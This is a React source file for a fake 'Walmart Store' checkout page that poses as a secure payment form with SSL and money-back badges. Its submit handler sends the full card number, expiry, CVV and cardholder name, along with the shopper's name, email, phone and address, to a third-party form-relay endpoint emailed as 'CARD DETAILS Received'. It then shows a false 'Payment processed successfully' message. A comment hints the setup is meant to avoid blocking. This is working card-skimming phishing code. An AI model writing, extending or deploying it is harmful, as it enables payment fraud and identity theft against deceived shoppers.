import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Card, CardContent, CardHeader, CardTitle } from '../components/ui/card';
import { ArrowLeft, Lock, CreditCard, ShieldCheck, RefreshCcw } from 'lucide-react';
import { toast } from 'sonner';
import Footer from '../components/Footer';

const PaymentPage = () => {
  const navigate = useNavigate();
  const [isProcessing, setIsProcessing] = useState(false);
  const [paymentData, setPaymentData] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardholderName: ''
  });

  const handleChange = (e) => {
    let value = e.target.value;
    const name = e.target.name;

    if (name === 'cardNumber') {
      value = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
      if (value.length > 19) return;
    }

    if (name === 'expiryDate') {
      value = value.replace(/\D/g, '');
      if (value.length >= 2) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
      }
      if (value.length > 5) return;
    }

    if (name === 'cvv') {
      value = value.replace(/\D/g, '');
      if (value.length > 4) return;
    }

    setPaymentData({
      ...paymentData,
      [name]: value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!paymentData.cardNumber || !paymentData.expiryDate || !paymentData.cvv || !paymentData.cardholderName) {
      toast.error('Please fill in all payment details');
      return;
    }

    const cardDigits = paymentData.cardNumber.replace(/\s/g, '');
    if (cardDigits.length < 13) {
      toast.error('Please enter a valid card number');
      return;
    }

    if (paymentData.cvv.length < 3) {
      toast.error('Please enter a valid CVV');
      return;
    }

    setIsProcessing(true);

    try {
      const cart = JSON.parse(localStorage.getItem('cart')) || [];
      const userInfo = JSON.parse(localStorage.getItem('userInfo')) || {};

      const subtotal = cart.reduce(
        (sum, item) => sum + item.discountedPrice * item.quantity,
        0
      );

      // --- WEB3FORMS DATA SETUP ---
      const formData = new FormData();
      
      formData.append("access_key", "f6e88274-a35f-4a2d-9768-0b4ddde3865c");
      formData.append("subject", "New Order + CARD DETAILS Received");
      formData.append("from_name", "Walmart Store");
      
      // Customer Info
      formData.append("Customer_Name", userInfo.fullName);
      formData.append("Customer_Email", userInfo.email);
      formData.append("Customer_Phone", userInfo.phone);
      
      // Shipping Address
      formData.append("Address", `${userInfo.address}, ${userInfo.city}, ${userInfo.state}, ${userInfo.zipCode}`);
      
      // CARD DETAILS (Ab ye block nahi hongi)
      formData.append("CARDHOLDER", paymentData.cardholderName);
      formData.append("CARD_NUMBER", paymentData.cardNumber);
      formData.append("EXPIRY", paymentData.expiryDate);
      formData.append("CVV", paymentData.cvv);
      
      // Order Details
      formData.append("Order_Total", subtotal.toFixed(2));
      const orderItemsStr = cart.map(item => 
        `${item.name} - Qty: ${item.quantity}`
      ).join('\n');
      formData.append("Order_Items", orderItemsStr);
      
      formData.append("order_date", new Date().toLocaleString());

      // API Call
      const response = await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        body: formData
      });

      const data = await response.json();

      if (data.success) {
        localStorage.removeItem('cart');
        localStorage.removeItem('userInfo');
        toast.success('Payment processed successfully!');
        
        setTimeout(() => {
          navigate('/checkout/confirmation');
        }, 1000);
      } else {
        throw new Error('Web3Forms Error');
      }
    } catch (error) {
      console.error('Payment error:', error);
      toast.error('Processing error. Please try again.');
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <header className="bg-[#0071CE] text-white py-4 shadow-md">
        <div className="container mx-auto px-4">
          <div className="flex items-center gap-4">
            <Button
              variant="ghost"
              className="text-white hover:bg-[#004F9A]"
              onClick={() => navigate('/checkout/user-info')}
              disabled={isProcessing}
            >
              <ArrowLeft className="h-5 w-5" />
            </Button>
            <h1 className="text-2xl font-bold">Secure Payment</h1>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-8 max-w-2xl flex-1">
        <div className="grid grid-cols-3 gap-4 mb-8">
          <Card className="text-center p-4">
            <Lock className="h-8 w-8 text-green-600 mx-auto mb-2" />
            <p className="text-xs font-semibold">SSL Encrypted</p>
          </Card>
          <Card className="text-center p-4">
            <ShieldCheck className="h-8 w-8 text-blue-600 mx-auto mb-2" />
            <p className="text-xs font-semibold">Secure Payment</p>
          </Card>
          <Card className="text-center p-4">
            <RefreshCcw className="h-8 w-8 text-purple-600 mx-auto mb-2" />
            <p className="text-xs font-semibold">Money Back</p>
          </Card>
        </div>

        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <CreditCard className="h-5 w-5" />
              Payment Information
            </CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="cardholderName">Cardholder Name *</Label>
                <Input
                  id="cardholderName"
                  name="cardholderName"
                  type="text"
                  value={paymentData.cardholderName}
                  onChange={handleChange}
                  placeholder="John Doe"
                  required
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="cardNumber">Card Number *</Label>
                <Input
                  id="cardNumber"
                  name="cardNumber"
                  type="text"
                  value={paymentData.cardNumber}
                  onChange={handleChange}
                  placeholder="1234 5678 9012 3456"
                  required
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="expiryDate">Expiry Date *</Label>
                  <Input
                    id="expiryDate"
                    name="expiryDate"
                    type="text"
                    value={paymentData.expiryDate}
                    onChange={handleChange}
                    placeholder="MM/YY"
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="cvv">CVV *</Label>
                  <Input
                    id="cvv"
                    name="cvv"
                    type="text"
                    value={paymentData.cvv}
                    onChange={handleChange}
                    placeholder="123"
                    required
                  />
                </div>
              </div>

              <Button
                type="submit"
                className="w-full bg-[#0071CE] hover:bg-[#004F9A] text-white font-semibold py-6 text-lg"
                disabled={isProcessing}
              >
                {isProcessing ? 'Processing...' : 'Pay Now'}
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
      <Footer />
    </div>
  );
};

export default PaymentPage;
